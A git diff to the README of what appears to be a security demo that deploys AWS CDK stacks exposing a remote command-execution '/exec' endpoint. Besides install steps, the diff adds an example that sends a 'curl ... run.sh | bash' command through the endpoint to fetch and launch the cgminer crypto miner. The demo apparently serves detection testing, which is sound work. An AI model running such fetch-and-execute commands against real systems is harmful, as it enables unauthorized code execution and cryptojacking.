@@ -19,6 +19,8 @@ NOTE: This is not a supported thing from Sysdig (as Sysdig supports CloudFormati
 
 ### Prerequisites
 1. Install node.js if required (using Homebrew or the OS pacakage repository such as apt, yum or dnf etc.)
+* Mac - `brew install node@18 awscli`
+* Ubuntu/WSL - `sudo apt update;sudo apt install -y nodejs npm` and https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html#getting-started-install-instructions
 
 ### Install the CDK Stacks
 1. First run `npm install` in this folder
@@ -69,6 +71,11 @@ $ curl -X POST [AWS ALB ADDRESS]/exec -d 'command=ls -la'
 ```
 
 This will capture and return the STDOUT of the command executed.
+
+Here is another example launching the cgminer crypto miner:
+```bash
+$ curl -X POST [AWS ALB ADDRESS]/exec -d 'command=curl https://raw.githubusercontent.com/sysdiglabs/policy-editor-attack/master/run.sh | bash'
+```
 
 ### Cleaning up
 Just run `npx cdk destroy --all -f` to clean everything up once you're done
